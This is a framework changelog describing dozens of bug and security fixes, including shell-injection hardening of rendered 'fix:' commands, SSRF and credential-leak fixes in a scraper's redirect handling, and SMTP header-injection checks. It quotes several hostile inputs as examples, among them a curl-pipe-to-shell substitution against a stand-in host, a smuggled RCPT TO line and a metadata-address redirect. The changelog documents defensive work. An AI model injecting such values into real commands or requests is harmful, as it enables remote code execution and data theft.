- **`pwa`: the offline outbox is drained on Safari and Firefox.** Where `registration.sync` is absent, `registerOutboxSync` falls back to posting `{type:'flush-outbox'}` to the controller, and the generated worker's message handler answered only `skip-waiting` and `build-id` — so on exactly the browsers the fallback exists for, queued offline mutations were never sent: no rejection, no request, no log. The branch is gated on the `backgroundSync` capability and carried in `CAPABILITY_SW_MARKERS`, so the both-directions marker test pins it. This was High #6 of the 2026-08-16 audit plan, which was marked done while the item never landed.
- **`render`, `admin`: route, boundary-violation, page-component and dev-panel ordering is by UTF-16 code unit, never `localeCompare`.** With no locale argument `localeCompare` reads the runtime's ICU default locale and collation version, so `/A` sorted after `/a` on one machine and before it on the next — `describeRoutes()` promises an order "identical for identical input", and everything downstream of it (`x.manifest.json`, the sitemap, `sw.js`'s rule table) is diffed across deploys.
- **`pwa`: `renotify` is never emitted without a `tag`.** `showNotification` rejects with a `TypeError` for the pair, so a push declaring `renotify` and no collapse key showed nothing at all. `renderPushPayload` drops the flag and reports it in `warnings`; the emitted handler recomputes it, because a push body is composed by whatever holds the VAPID key.
- **`pwa`: the `short_name` fallback truncates by code point.** `name.slice(0, 12)` counts UTF-16 code units, so a name whose 12th unit was the high half of a surrogate pair emitted a lone surrogate — U+FFFD in the home-screen label of any app named with an emoji.
- **`pwa` docs: `ServiceWorkerConfig.shellUrl`/`shellRevision`/`shellBytes` and `PwaRoute.dataUrl` have no producer in the framework's build path**; the shell trio's comment claimed it was "precached for every `spa` route" after `spa` was deleted from `RENDER_MODES`. Kept rather than removed — a public field is a major — and named as candidates for the next major's declared-and-never-wired sweep.
- **`pwa`: `X_PWA_NO_OFFLINE_FALLBACK`'s `fix:` is an instruction that works.** It said `create app/offline.tsx and set offline.fallback` — a filename `registerRoute` refuses with `X_ROUTE_FILE_INVALID` (the directory is the URL) and a config key `app.config.ts` does not have. It is now `x g route offline --surface site`, then `pwa.offline.fallback`. `site/` deliberately: the document answering a lost network must render with no network, no session and no database.
- **`pwa`: the offline document can carry a content hash.** `ServiceWorkerConfig` gained `offlineFallbackRevision` and `offlineFallbackBytes`, forwarded to `buildPrecacheManifest`; it had no field for either, so the one page an offline navigation depends on was the single precache entry stamped with the build id and counted as 0 bytes against the install-size warning. `x build --target static` passes both.

- **`catchUp: 'skip'` did not skip: it fired once per `maxCatchUp` window per tick until the walk
  reached now.** Measured on a minute cron (`* * * * *`, UTC, the defaults) whose dev server was
  down 14:23Z–17:34Z: on boot the scheduler logged `jobs.scheduler.dispatched … catchUp=true`
  twenty times a second apart — 14:23, 14:33, … 17:33 — for a policy documented as "collapses them
  into ONE dispatch for the LATEST missed occurrence". `occurrencesSince` walks forward from the
  watermark and is truncated at `maxCatchUp`, so its last element was the tenth minute after the
  watermark and not the latest occurrence missed; `dispatch` then left the watermark there, and
  the next tick found the next ten. `skip` now dispatches the real latest occurrence at or before
  `at`, found by bisection over the resolver (`latestOccurrenceBy` — about 25 calls for a
  three-hour gap, never one per missed minute), so the occurrence key names the occurrence the
  payload is for and the tick after it dispatches nothing. `run-once` had no equivalent hole: it
  fires the earliest missed occurrence, which truncation cannot move, and already advances its
  watermark to `at`. `wiki/Scheduled-Tasks.md` stops saying `maxCatchUp` "caps the lookback for
  every policy" — it bounds one round of `'run-all'`, and nothing else.

- **The job queue's own step persistence tripped the N+1 write detector.** Every job of five or
  more steps logged `X_N_PLUS_ONE_WRITE: insert into x_job_steps … on conflict (run_id, name) do
  update … ran 5 times in one request — one write per row` under `x dev`, with a `fix:` naming
  `expectedQueryLoop` that the app could not apply to a statement it never wrote. One row per
  `step.run` is the design — each step completes at its own instant and its output has to be
  durable before the next one starts, so the writes cannot be batched. `steps.ts` now issues the
  write inside `expectedQueryLoop`, so it reaches the funnel with `expected` set — the field the
  ledger reads before it counts — while the hydrating `list` and the job's own statements are
  judged exactly as before; nothing is silenced globally. `@ultimat3/jobs` gains a declared
  `@ultimat3/db` dependency for that one marker (tier 3 → 1, drawn on the package map). It still
  takes no client from it: `PgExecutor` stays the only way the queue reaches Postgres.

- **The secrets master key can no longer ship inside a production image.** Every `.dockerignore` in the tree and the one `x new` writes excluded `.env*` and `.npmrc` but not `.secrets.key`, so the runtime stage's `COPY . .` baked the AES master key into a layer beside the committed `secrets.enc.json` it decrypts — and `findMasterKey` reads the key file whenever `ULTIMATE_SECRETS_KEY` is unset, so the container booted on the baked key and the platform's key was never exercised, while `wiki/CLI-Reference.md` promised an image that "ships no key file at all". All five files carry `**/.secrets.key` now, the template reads the name from core's `SECRETS_KEY_FILE`, and `scripts/image-contract.ts` refuses any `*.dockerignore` without it (`X_IMAGE_SECRET_UNIGNORED`, a step of the `boundaries` check).
- **A teardown after a spent drain gets a real budget.** The release phase (`app.stop()`: the outbox relay, the worker, the sync node, the server, then the pool, NATS, the cache tiers, the mail driver) was given the drain's leftover, which is negative the moment one in-flight request outlives the deadline — so `releaseWithin` abandoned it at 0 ms and logged "was still running 0ms", reading as a slow teardown when there had been no budget at all. The pool was never closed and the relay could be killed between `enqueue` and `markPublished`. `MIN_RELEASE_MS` (5 s) is a floor, never a clamp; 25 s + 5 s still sits inside the chart's 45 s termination grace.
- **`x mcp serve` no longer wedges on one transient boot failure.** `startServices` and `ensureReadOnlyRole` were memoised with `??=`, so a rejected promise was the answer for the life of the stdio session; `retryMemo` clears on rejection, the rule `packages/db/src/pglite.ts` already followed.
- **`docker/Dockerfile`'s comment names the ignore file that exists.** It said a root `.dockerignore` drops `node_modules`; there has never been one — BuildKit reads `docker/Dockerfile.dockerignore`, and a builder that does not honour `<Dockerfile>.dockerignore` reads no ignore file at all.
- **`jobs`: the outbox relay takes part in the process drain.** It registered no lifecycle hook — every other loop registers two — so it claimed and published through the whole shutdown and past `state === 'stopped'`, stamping leases on rows nothing on the pod would run and, abandoned between `enqueue` and `markPublished`, republishing a row on the next boot. An `accept` hook stops polling, a `close` hook waits out the pass in flight under the drain deadline, the poll timer is `unref`ed, and `createOutboxRelay` moved to `outbox-relay.ts` (barrel exports unchanged).
- **`jobs`: a webhook receiver's `409 Conflict` is retryable again.** `webhook.ts` kept a private retryable-status table that omitted the 409 core's one table has always carried, so a concurrent-writer response dead-lettered the delivery on attempt 1 with the whole retry budget unspent.
- **`jobs`: the memory driver rejects a duplicate `onConflict: 'error'` enqueue instead of throwing synchronously, and a cancelled job clears `claimedBy`/`visibleAt` as `SQL_CANCEL` does** — two answers where the pg driver had one, deferred from the previous sweep.
- **`http`: `stop()` hands its two shutdown hooks back on the SIGTERM path too.** The close hook clears `server`, and the early return was skipping the release, leaking two registrations per server per lifecycle.
- **`core`, `http`, `auth`, `mcp`: a value reaching a command position in a `fix:` is rendered by the new `renderFixShellArg`, or refused by `FRAMEWORK_CODE`.** An unrouted `GET /$(curl …|sh)`, an issuer URL with shell punctuation in `curl -sS -m 5 <url>`, and a thrown `code: 'X_$(id)'` each composed a command substitution into the line the framework tells its reader to run; `renderFixLiteral` double-quotes, which makes none of those inert, so the safe set is closed and anything else becomes a named placeholder while the value still travels in the `cause`.
- **`scraping`: the HTTP leg follows a redirect one hop at a time, under the same gates as the first request.** `httpOverFetch` called `fetch` with the platform default `redirect: 'follow'`, so a scraped endpoint answering `302 Location: http://169.254.169.254/…` had its target fetched from inside the worker's network with no `allowHosts`, no robots check and `res.url` still reporting the allow-listed URL — the exact SSRF the package's own header says the allow list exists to close, and the CDP leg already screened per hop. Each `Location` is now screened, paced, cookie-scoped and recorded under the URL actually requested; the fetch-spec method downgrade (303, and 301/302 after a POST, become a bodiless GET) is applied so a redirected order body is never re-sent; a chain past `MAX_REDIRECT_HOPS` (10) is `X_SCRAPE_REDIRECT_LOOP`, terminal.
- **`scraping`: a `javascript:` URL is refused, never treated as a hostless scheme.** It sat on the `about:`/`data:`/`blob:` branch of `hostDecision`; `javascript://api.test/%0a…` parses with hostname `api.test`, so an allow list naming that host would have matched it.
- **`realtime`: two concurrent `replicator.start()` calls start one feed, and two concurrent `tryAcquire()` calls open one session.** Both checked a flag, awaited, then set it — so the second caller passed the guard, `feed.start()` ran twice on one slot (two seq generations, a change gap on every sync node), and the second advisory-lock session orphaned the first, which held the lock until the process died. The in-flight acquisition is memoised in one synchronous step, and `stop()`/`release()` wait it out.
- **`admin`: the `/_x` stylesheet memo is one promise, not a chain.** The rejection-clearing wrapper re-ran on every request, publishing a new promise each time and retaining the previous one; it is created once, in the shape `packages/db/src/pglite.ts` uses, with an identity guard so a late rejection clears its own attempt.
- **`db`: `unknownSchema`'s `fix:` screens the migration id and name through `shellInertIdentifier`** before they reach `git checkout -- "*<id>.snapshot.json"` and `x db gen "<name>"`, degrading to prose when hostile; an empty id keeps its glob, because `""` substitutes nothing.
- **`entity`: a `uuid` written in upper case is stored lower-cased in both drivers**, so `countBy` no longer keys its map one way in memory and the other in production — `parseUuid` and a new `narrowUuid` on the write path, the rule `keyOf('uuid', …)` already applied to equality.
- **`schema`: a `record`'s published JSON Schema carries `propertyNames: { not: { enum: […] } }`**, so OpenAPI, the typed client and an MCP tool stop advertising the `__proto__` / `constructor` / `prototype` keys the parser answers with a 422. `PROTOTYPE_KEYS` is one declaration, read by both views.
- **`schema`: the published `date` node is documented and pinned as the deliberately narrower of the two views** — the parser's epoch-millisecond convenience is not advertised as a supported spelling.
- **`entity`: ordering by a `timestamptz` column whose microsecond alias would exceed 63 bytes is refused at plan time** instead of silently losing cursor precision to a truncated identifier.
- **`entity`: the in-memory driver's `updateWhere` applies the same `MAX_ASSERTED_ROWS` ceiling the Postgres driver does**, so a sweep a test green-lit is no longer one production refuses.
- **`seo`: a title and a description are measured in characters via `@ultimat3/schema`'s `charCount`**, so an astral emoji counts as one character rather than two; `@ultimat3/seo` gains a declared `@ultimat3/schema` dependency (tier 1 → 0).

- **The sync node's drain no longer waits its grace for nobody.** `drain()` slept
  `DEFAULT_DRAIN_GRACE_MS` (5s) after sending its reconnect frames whether or not it held a socket
  to owe one to. Measured 2026-09-06 on ai-maxxing: Ctrl-C on `x dev` with no browser open took
  5.1s, and 5.0s of it was this sleep over an empty table — the one line between `draining` and
  `jobs.worker.draining` in the log. The grace is now waited only while a socket is held, and ends
  the moment the last one leaves (`teardown` wakes it) rather than when the clock says.
  `listenSyncNode` takes `drainGraceMs`, and `x dev` passes `0`: one node, whose clients reconnect
  to it once it is back and to nothing in the meantime, so a grace that kept their patches flowing
  was time spent on a reconnect frame whose target did not exist yet. Production keeps the default.
- **`scraping`: a cross-origin redirect hop no longer carries the caller's credentials.** The jar was
  re-scoped per hop and the HEADERS were not, so an `authorization` set for the first host was
  replayed verbatim to wherever a `302` pointed — the leak `cookie-scope.ts` exists to prevent,
  arriving through the other door. `authorization`, `proxy-authorization` and a hand-written
  `cookie` are dropped at the first cross-origin hop and stay dropped for the rest of the chain
  (`A -> B -> A` does not hand the bearer back), which is what the platform's own `redirect: 'follow'`
  did before this leg took the chain over. Every other header still rides, and a same-origin hop is
  untouched — an API that redirects within itself still authenticates.
- **`scraping`: a `301`/`302` rewrites a `POST` and nothing else.** `carriesBody` kept the method for
  `GET`/`HEAD` and rewrote everything else, so a `PUT` or a `DELETE` answered with a permanent
  redirect was re-asked as a bodyless `GET`: one read, a 200, and the caller's write silently not
  happening. The fetch standard permits the rewrite for `POST` alone; `303` still rewrites every
  method but `GET`/`HEAD`, `307`/`308` still carry both, and the method is now read
  case-insensitively, because `fetch` normalises `post` to `POST` on the way out.
- **`scraping`: a redirect chain past `MAX_REDIRECT_HOPS` releases the hop body before it refuses.**
  The throw jumped over `discardHopBody`, so the refusal path — the one a hostile chain drives ten
  times per request — was the one path that held its socket until the collector arrived.
- **`realtime`: a replicator whose feed fails to start hands the advisory lock back.** `running` was
  set before `await feed.start()`, so a rejected start left this node holding the lock and claiming
  to run while pumping nothing: the takeover loop's next `start()` was answered `true` by the
  `if (running)` guard without re-entering `begin`, and every standby stayed a standby of a slot
  whose holder was not replicating. `running` is set after the feed is pumping, and the failure path
  releases.
- **`entity`: `narrowRow` lower-cases only a uuid Postgres would have accepted.** The narrowing
  exists to make the in-memory row the one production holds, and production holds nothing for a
  malformed uuid — it refuses the insert — so lower-casing one produced a third spelling neither
  driver has. A value that is not a uuid is now left exactly as the caller spelled it.
- **`scripts/image-contract.ts` reads a `.dockerignore` in ORDER.** Docker obeys the last rule that
  matches a path, so `**/.secrets.key` followed by `!**/.secrets.key` is a build context with the
  master key in it — and a check spelled "does the line exist" passed that file. A re-include now
  counts however it is spelled (`!**` and `!*.key` re-admit the key too), and an unrelated negation
  — the `!**/.env.example` every ignore file in this tree carries — still leaves the exclusion in
  force.


- **New: `bun run fix-shell-arg` refuses a value spliced into the shell command position of a `fix:` line.** `x g route /$(curl -s http://evil.sh|sh)` was a real rendered fix, `renderFixShellArg` closed that one site, and nothing watched the other 152 — every value was typed `string`, which `error-render` does not read. Matched on POSITION, never a name; a ratchet pinned per package with the sentence saying where each package's values come from.
- **The gate's own rules stopped reading green through the defect each was written for.** `proto-index`'s null-prototype exemption is per TABLE, not per file (one unrelated `Object.create(null)` hid a caller-supplied `DIALECTS[dialect]` on a public entry point of `@ultimat3/schema`); `skip-if-cleanup` tracks the reset per callee, so a file-scope `afterAll(() => resetClock())` no longer launders a `clearRegistry()` parked inside `describe.skipIf`, and it reads `registry.clear()`, the braced one-line early return and `afterAll(clearRegistry)`; `sql-literal-copies` walks balanced parentheses, so `split("'").join("''")` is the escape it always was; `secret-compare` learned `startsWith`/`endsWith`, `indexOf`, `switch`/`case` and `deepEquals` — `@ultimat3/auth` measured zero before and after; `index-of-order` reads the `OrEqual` matchers a phantom `-1` passes identically; `flight-copies` recognises `Math.pow`, a ternary clamp and a curve rolling `crypto.getRandomValues`; `framework-tables` reads a quoted or schema-qualified relation; `config-readers` derives leaves from a `type` alias and any indent, checked against a config `defineConfig` actually builds; the admin-flattener check reads the seven `.tsx` screens it skipped.
- **A pin with a blank reason waives nothing** in `config-readers`, `secret-compare` and `proto-index` (`X_*_PIN_UNEXPLAINED`), and `configAmbiguityPinnedFor` is finally called by the rule that declared it.
- **`render-modes`, `frozen-records` and `flight-copies` publish their findings in `--json`** instead of `findings: []` on a red run, and the first two carry an `X_*` code at all (`X_VOCABULARY_REDECLARED`, `X_FROZEN_RECORD_INFERRED`).
- **A bare `x test` runs `live` and `e2e` files in their own one-worker pass.** The serial clamp applied only when a type was named, so `x test --workers 8` ran a replication-slot suite and a shared-`dist/` suite at `--parallel=8` beside the unit files; the selection is partitioned by each file's own type and the serial types get a `--parallel=1` pass each.
- **`X_PORT_IN_USE`'s fix names a port pair that is free.** Both `x dev` and `x doctor` suggested `x dev --port <web+1>` — the sync port that was just reported occupied — and two tests pinned it under names promising the opposite; `portPairAfter` answers the nearest base whose own `PORT`/`PORT+1` touches neither, and `x doctor` derives the sync port through `syncPortFor`, so `--port 65535` is `X_PORT_INVALID` rather than a probe of 65534.
- **Everything after `--` reaches `bun test`.** `ParsedArgs.passthrough` was documented as "handed to the underlying tool verbatim" and read by nothing, so `x test unit -- --coverage --bail` dropped both flags silently; `test` declares it and forwards it, and every other command refuses a `--` tail with `X_CLI_BAD_FLAG`.
- **The job queue's database client reads the environment the boot was handed.** `startQueue` called `startDb` without `env`, so `DATABASE_REPLICA_URL` came off `process.env` while the replica middleware was decided from the boot env — two halves of one decision from two sources; `env` is a required parameter now.
- **`x g admin:page` declares the permission it requires and refuses a malformed `--permission`.** The scaffold emitted `permissions: ['ops:read']` that no app declared, so the generated page was denied for every actor; the `policy` gate step still cannot see admin pages (no registry in `@ultimat3/admin` to read — deferred).
- **`cli`: a caught value's `code` is read through `stringField` at two sites; `prettyJson` sorts every level; the boundary check sees `node:http`; the stale step ordinals are gone.**
- **`jobs`: the redis and nats stubs' `X_NOT_IMPLEMENTED` fix names a repair that runs.** It told the operator to `x jobs drain --to memory`, the invocation the CLI now refuses; `enqueue` on a stub refuses too, so nothing was ever queued onto one and there is nothing to move — `setJobDriver(createPgDriver())` at boot is the whole repair. `wiki/Jobs-And-Workflows.md`, the jobs tutorial, `wiki/Upgrading.md` and `docs/architecture/04-error-contract.md` stop promising a drain procedure nothing rehearses.
- **`mcp`: the stdio transport waits for every frame to leave the process.** `defaultWrite` returned `void` while `Bun.stdout.write()` returns a promise, so every `await write(...)` in `serveStdio` awaited nothing and the CLI exited with the tail of a large `tools/call` result still queued — measured, a 4 MB frame arrived at 1.4 MB. The same rule `emitManifest` already followed, now pinned by a child-process test.
- **`mail`: an SMTP envelope accepts a display-form recipient.** `to: 'Jane Doe <jane@x.test>'` rendered a correct `To:` header and then hit `assertEnvelopeAddress`, which refuses angle brackets, so the SMTP driver answered `X_MAIL_ADDRESS_INVALID` for an address every other driver delivered. The normalisation lives at the one gate both `MAIL FROM` and `RCPT TO` pass through — control characters are checked on the RAW value first, because stripping first would let `bcc: 'ops@x\r\nRCPT TO:<attacker>'` through as a clean mailbox, which the package's own injection test proves.
- **`mail`: `From`, `To` and `Cc` are 7-bit on the wire.** A non-ASCII display name went out as raw UTF-8 while `Subject` was RFC 2047-encoded, and the client never negotiates `SMTPUTF8`; the phrase is encoded and the addr-spec copied verbatim, so an ASCII header is byte-identical to before.
- **`notify`: `markRead` with a malformed id answers 0 instead of raising `22P02`.** The Postgres store bound `any($2::uuid[])`, so one hand-typed id in a batch lost every good one where the memory twin skipped it; ids are screened before binding, and the memory `list` gained the `id` tiebreak the SQL always had.
- **`manifest`: `ActionFact.mutator` and `mcp.description` are classified.** Losing `mutator` is breaking (it decides HTTP method and idempotency in the typed client and OpenAPI), gaining it is additive, a description change is internal; until now two manifests differing only in `mutator` diffed as `buildId` alone — the exact class the file's own header names.
- **`ai`: `deleteSql([])` emits `1 = 0`, not `"id" in ()`; a usage-only `message_delta` no longer overwrites `stopReason` with `end_turn`; `jsonSchemaValid` reads required keys through `Object.hasOwn` so `['constructor']` scores 0; `embedBatched` refuses an embedder that returns fewer vectors than texts with `X_AI_EMBEDDER_INVALID` instead of a `TypeError` in the store.**
- **`mcp`: a schema property named `__proto__` is a property.** `input-schema.ts` assigned through the setter, so `tools/list` published a schema missing it while `validate-args` refused it as unknown.
- **A value a shell would read no longer reaches a `fix:` in `auth`, `db`, `core`, `http`, `cache` or `scraping`.** A provider's `jwks_uri`, userinfo and token endpoints (all filled from the issuer's own discovery document), a migration file name on the `rm` that deletes a migration's files, a secrets path inside `export KEY="$(cat …)"` and on three `git checkout --` lines, a purge endpoint from `.env.production`, a browser profile directory on an `rm -f`, and a `code` read off a foreign throwable now go through `renderFixShellArg` / `FRAMEWORK_CODE` / a whole-line degradation to prose; the value still travels in the `cause`, which is read rather than pasted.
- **`schema`: `toJsonSchema` refuses a dialect nothing publishes instead of answering with `Object`'s constructor.** `DIALECTS[dialect]` was a prototype-reachable read on a public entry point's option, hidden from `proto-index` by an unrelated null-prototype table in the same file, so `dialect: 'constructor'` put the `Object` function in `$schema`, where `JSON.stringify` dropped it in silence; it is `Object.hasOwn` plus `X_SCHEMA_UNSUPPORTED` now, refused whether or not `includeDialect` would have emitted it.

- **`x dev` registers one watcher per admitted directory instead of one recursive watch on the app root.** Bun's `fs.watch` has no ignore option, so the old `isIgnoredPath` filtered EVENTS after the kernel had already registered a descriptor for every directory under the root — 110 on the reference app, 61 of them under `.git/`, `node_modules/` and the `.x/` this same process writes to continuously; 1,901 on a monorepo root, 78 % under `.git/` and `node_modules/`, so one `git status` delivered five index events into the JS callback. The watch set is a REGISTRATION decision now: a prune-at-descent walk, `watch(dir, { recursive: false })` per admitted directory, pickup on a `rename` that creates one, release on removal. 110 → 49 descriptors, exactly the admitted count, pinned by a Linux test that reads `/proc/self/fdinfo`.
- **The `x dev` ignore set is the app's own `.gitignore`**, parsed once with git's semantics (anchoring, `!`, trailing-slash directory rules, `*`/`**`/`?`, escaped `\#`), inherited from every ancestor ignore file up to the repository root, and re-read in place when it is edited — `touch tsconfig.tsbuildinfo`, the file `bun run typecheck` rewrites, ran a full `appManifest()` + `buildIslands()`; 54 git-ignored directories on the framework root were unfiltered. `.git`, `.x`, `node_modules`, `.personal` and `.claude` stay a floor no ignore file needs to name. `fix-path.ts`'s private `.gitignore` parser is gone; both read one.
- **`dist` and `coverage` are no longer ignored at any depth.** The segment match hid an app's own `/dist` or `/coverage` route from the reload with no message — the failure `dev-watch.ts`'s own header calls worse than the one it replaced. Under git an unanchored `coverage/` matches at any depth too, so `x new` writes `/dist/` and `/coverage/` root-anchored, which is also what lets git commit such a route.
- **A watcher event with no filename is logged once instead of killing `x dev`.** Bun delivers `undefined` when the root is renamed or removed — `mv myapp myapp2`, a re-clone, a volume remount — and `isIgnoredPath(undefined)` threw inside an fs callback, outside every handler.
- **A save arriving while a reload is still building coalesces into one trailing rebuild.** Measured: a 45 ms drip (a slow `git checkout`, a formatter walking files) ran 40 overlapping rebuilds whose results landed in completion order, so an earlier, slower one could overwrite the newest.
- **Six CLI scans matched `node_modules` as a substring of the absolute path**; an app checked out under `~/dev/node_modules-experiments/myapp` loaded zero modules and reported a green, empty manifest. One segment predicate now.
- **`x dev`'s watcher debounce is screened with `finiteCount`** — `??` guards nullish and `NaN` is not, so an unparsed `debounceMs` walked past the default into `setTimeout(fn, NaN)`, which coerces to 0: the debounce read as installed while every keystroke ran a full `appManifest()` plus `buildIslands()`.

### Commits

- fix(cli): x dev watches only what the app owns — registration, not filtering (#420)
- fix: sweep 3 of the deep-dive bug hunt — the gate's own rules, the CLI, and 47 findings (#419)
- fix: sweep 2 of the deep-dive bug hunt — 23 findings on three axes (#418)
- fix(realtime): the sync node's drain no longer waits its grace for nobody (#416)
- fix: sweep 1 of the deep-dive bug hunt — 25 findings across 14 packages (#417)
- fix(jobs): `skip` catches up once, and the step write is declared one-per-step (#415)

## 19.2.0 - 2026-09-06

Six more seams surfaced by the same app, one day on, plus five found by building a **second**
app — a Romanian point-of-sale register — on 19.1.3 the same day. Every entry names its
measurement. None is breaking.

### Added

- **`t.tracking()` — the tenth token accessor.** `$letter-spacing` has been emitted as
  `--tracking-tight | normal | wide` since the scale existed, and was the ONE emitted scale with
  no function to read it, beside nine that had one. An app writing `tokens.tracking('wide')` got
  `X_PRERENDER_FAILED: Undefined function` and had to fall back to `var(--tracking-wide)` — and so
  did the framework, in its own `reset.scss:44` and `Divider.module.scss:26`, where a raw
  `var(--tracking-tight)` sat directly beneath three `t.*()` calls. Both now read the function.
  `tokens.test.ts` gated seven scales and skipped `$letter-spacing` entirely, which is how a whole
  scale shipped with no accessor; the test now asserts every emitted scale is reachable through
  one, with font family the single pinned exemption and its reason recorded (a comma-separated
  stack is replaced whole by `defineTheme()`, not picked off a rung). `wiki/Theming.md` gains a
  **Read it with** column naming each accessor, and stops claiming a universal TS mirror that two
  scales never had.

- **A query's `page()` is reachable through its GET route.** `GET /_x/query/<name>` answered a
  bare array and nothing else, so a read over a paged external source had nowhere to put its page
  marker but on a row — ai-maxxing's `sessionMessages` carried an `olderCursor` column on its
  oldest message and the island recovered the cursor from the data. The route now reads two
  controls off the search string before the schema sees it: `?_first=<n>` answers the `Page`
  envelope `.page()` answers a server caller with — `{ rows, endCursor, hasNextPage }`, the same
  names, and the wire cursor is the very string a direct call signs — and `&_after=<endCursor>`
  continues it; with neither the answer is the bare array it always was. The keys carry an
  underscore because `first` is a legal input member (the package's own tests declare one);
  declaring `_first` or `_after` as input is `X_QUERY_INPUT_UNENCODABLE` at `query()`. A size
  outside 1–10,000, a non-integer, an `_after` without `_first` or a control sent twice is **400**
  `X_INPUT_INVALID` judged at the wire (`packages/query/src/page-controls.ts`) — `paginate`'s own
  `assert` was a 500 `X_INVARIANT` blaming the server for a number the caller typed.
  `feed.client(…).page(input, { first, after })` and `queries.feed.page(…)` read the same
  envelope. `openapi.json` gains the read half of the API it never had: one `GET` path item per
  registered query with its input as `in: query` parameters, the two controls, and a `200` that is
  `oneOf` the rows and the envelope (`queryOpenApiPaths`, merged into `@ultimat3/action`'s
  document by the CLI); both tracked apps' specs are regenerated and their `manifest` step stays
  green. Proven end to end on `examples/dummy`'s `liveFeed` against the seeded database: two
  disjoint pages and a terminal one. The MCP read tool still does not page.

- **`@ultimat3/testing`'s island DOM answers combinators, a box, a scroll offset and a
  `ResizeObserver`.** Measured on an app's virtualized list: `mountIsland`'s `find`/`all` read one
  regex — `[attr="value"]` or a bare tag — and a selector outside it MATCHED NOTHING
  (`find('[data-role="list"] button')` was a tag with a space in it), `clientHeight`/`scrollTop`/
  `scrollHeight` were `undefined` (so `Math.ceil(height / row)` was `NaN` rows with no throw near
  the cause), and `ResizeObserver` did not exist, so the island took the fallback branch no
  browser takes. `island-selector.ts` reads compounds of tag, `#id`, `.class`, `[attr]` and
  `[attr="value"]` joined by a space (descendant) or `>` (child), matched right to left as CSS
  matches, and refuses everything else as **`X_TEST_ISLAND_SELECTOR_UNSUPPORTED`** with the offset
  — never an empty answer. Every element carries `clientWidth/Height`, `offsetWidth/Height`,
  `scrollWidth/Height`, `scrollTop/Left` as writable numbers (0 until written: this DOM lays
  nothing out), `getBoundingClientRect()` and a `scrollTo` that runs the `scroll` listener.
  `island-observers.ts` is a recording `ResizeObserver`, one registry per document;
  `mounted.resize(el, { width, height })` writes the box and delivers a spec-shaped entry to every
  observer of THAT element, `mounted.scroll(el, { top })` moves the offset,
  `mounted.observing(el)` is the teardown assertion, and `mountIsland({ size })` lays out the host
  before `mount` — the one element that exists then. `observe()` fires nothing on purpose: the
  browser's initial notification lands after `mount` returns, and here it is the test's `resize`.
  `IntersectionObserver` is the same class of gap and is not modelled.

### Changed

- **`setSolidRuntime(solidRuntime)` from `import * as solidRuntime` shipped all of solid-js in
  every island chunk.** A namespace object handed to a function keeps every export alive, and the
  bundler cannot shake what it cannot see unused. Measured with the island bundler's own settings
  (minified, production, no splitting): the namespace registration is 28,556 B against 13,708 B
  for the six members the contract names — 14.8 kB per island (5.6 kB gzipped) that nothing
  calls; `solid-js/web`'s `render` alone is 12,238 B, so it is the namespace and not `render`
  that drags the core in. On the island `x g resource` emits: 67,159 B → 52,900 B (25,340 →
  19,883 gzipped). The paste line is now six named imports — `setSolidRuntime({ createContext,
  useContext, createSignal, createMemo, createEffect, onCleanup })` — in the generator template,
  both `X_UI_RUNTIME_MISSING` fix lines, the ui README and the wiki. Not breaking: `SolidRuntime`
  is unchanged and `typeof import('solid-js')` still satisfies it, pinned by test; an existing
  island keeps compiling and registering, it only keeps paying the bytes until its two lines are
  replaced. `resource-form-island.test.ts` builds the emitted island and asserts the chunk no
  longer carries a string only an unshaken solid-js does.

- **`ISLAND_PROPS_MAX_BYTES` is 16,384, up from 4,096.** The props bag is inlined verbatim as a
  JSON `<script>` in every document and `measureDocumentJs` counts a JSON script as zero JS, so
  this constant is the only ceiling on that channel. 16 KiB is a bag comparable in size to the
  island's own code and never more (`DEFAULT_ISLAND_JS_BYTES`: 20 KiB `site/`, 34 KiB `app/`):
  ~3–4 KiB gzipped, under 100 ms on a 3G-class link, ~1 ms of `JSON.parse`; ~320 ms uncompressed,
  which is why it remains a hard ceiling and not a warning. The arithmetic is the constant's own
  doc comment. A medium bag is no longer a 500; a catalog is still the wrong thing to inline, and
  the `fix:` says so.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
